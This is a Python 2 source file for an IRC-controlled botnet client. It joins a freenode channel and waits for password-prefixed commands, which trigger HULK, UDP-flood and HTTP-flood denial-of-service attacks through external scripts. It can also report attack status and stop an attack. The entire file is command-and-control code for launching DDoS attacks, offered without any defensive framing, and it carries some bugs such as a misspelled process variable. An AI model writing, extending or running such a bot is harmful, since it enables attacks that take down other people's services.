from irc import *
import random
import argparse
import subprocess as sp

rand = random.randint(1, 9999)  # Integer from 1 to 10, endpoints included
print rand

# Connection parameters
server="irc.freenode.net"
botnick="TestBot" + str(rand) # create random botnick
channel="##secretgovermenttestsite913"

# password to accept commands
password="@!!@"

irc = IRC(server, botnick, channel) # create irc object
irc.connect() # connect to server
irc.send(channel, "New Bot Online!")

# """
# Command functions
# """

def roll_call():
    print("Roll Call: Here!")
    irc.send(channel, "Here!")

def say_hello():
    print("Hello!")
    irc.send(channel, "Hello!")

def launch_ddos(target_ip, tartget_port, num_of_attacks):
    print "Launching test attack script"
    global extProc
    extProc = sp.Popen(['python','myPyScript.py', 'hello']) # runs myPyScript.py 
    status = sp.Popen.poll(extProc) # status should be 'None'
    if status == None:
        print status
        irc.send(channel, "Attack started!")
    else:
        print status
        irc.send(channel, "Failed to start attack")
        sp.Popen.terminate(extProc) # closes the process
        sp.Popen.wait(extProc) # closes the process
        status = sp.Popen.poll(extProc)

def launch_hulk(target):
    print "LAUNCHING HULK ATTACK!!"
    global extProc
    extProc = sp.Popen(['python','hulk.py', str(target)])
    status = sp.Popen.poll(extProc) # status should be 'None'
    if status == None:
        print status
        irc.send(channel, "HULK HAS STARTED")
    else:
        print status
        irc.send(channel, "Failed to start attack")
        sp.Popen.terminate(extProc) # closes the process
        sp.Popen.wait(extProc) # closes the process
        status = sp.Popen.poll(extProc)

def launch_udp(target_ip, target_port, time_of_attack):
    print "Launching UDP flood"
    global extProc
    extPgoc = sp.Popen(['python','udpflood.py', str(target_ip), str(target_port), str(time_of_attack)])
    status = sp.Popen.poll(extProc) # status should be 'None'
    if status == None:
        print status
        irc.send(channel, "UDP flood has started")
    else:
        print status
        irc.send(channel, "Failed to start attack")
        sp.Popen.terminate(extProc) # closes the process
        sp.Popen.wait(extProc) # closes the process
        status = sp.Popen.poll(extProc)

def launch_http(target_ip, target_port, num_of_attacks):
    print "Launching HTTP flood"
    try:
        global extProc
        extProc = sp.Popen(['python','ddos.py', str(target_ip), str(target_port), str(num_of_attacks)])
        status = sp.Popen.poll(extProc) # status should be 'None'
        if status == None:
            print status
            irc.send(channel, "HTTP flood has started")
        else:
            print status
            irc.send(channel, "Failed to start attack")
            sp.Popen.terminate(extProc) # closes the process
            sp.Popen.wait(extProc) # closes the process
            status = sp.Popen.poll(extProc)
    except Exception as e:
        sp.Popen.terminate(extProc) # closes the process
        sp.Popen.wait(extProc) # closes the process
        status = sp.Popen.poll(extProc)
        print e
        pass

def check_attack_status():
    try:
        global extProc
        print "Checking attack script status: "
        status = sp.Popen.poll(extProc) # status should be 'None'
        if status == None:
            irc.send(channel, "Still active!")
        else:
            irc.send(channel, "Script is down")
        print status
    except Exception as e:
        print e
        pass

def stop_attack():
    global extProc
    print "Stopping attack script"
    sp.Popen.terminate(extProc) # closes the process
    sp.Popen.wait(extProc) # closes the process

    status = sp.Popen.poll(extProc)
    irc.send(channel, str(status))
    print status

def main():

    try:

        while 1:
            time.sleep(0.1)
            try:
                # get text from irc channel
                text = irc.get_text()
                print(text)
            except Exception:
                pass

            # check for message with correct format
            if "PRIVMSG" in text and channel in text and password in text:
                # remove all other formating 
                command = text.split(password,1)[1]
                command = command.strip("\r\n")
                commands = command.split(" ")

                print "Command called: " + str(commands)
                # print "hi" == command
                # print type(command)
                # print type(commands)
                # print commands

                # look for supported commands
                if str(commands[0]) == "hi":
                    say_hello()
                if str(commands[0]) == "RollCall":
                    roll_call()
                if str(commands[0]) == "Attack":
                    launch_ddos(commands[1], commands[2], commands[3])
                if str(commands[0]) == "Hulk":
                    launch_hulk(commands[1])
                if str(commands[0]) == "UDP":
                    launch_udp(commands[1], commands[2], commands[3])
                if str(commands[0]) == "HTTP":
                    launch_http(commands[1], commands[2], commands[3])
                if str(commands[0]) == "Check":
                    check_attack_status()
                if str(commands[0]) == "Stop":
                    stop_attack()

                # print "found it"
                text =""

    except KeyboardInterrupt:
        print "KeyboardInterrupt"
    finally:
        # clean up
        irc.close_connection()

if __name__ == "__main__":
    main()
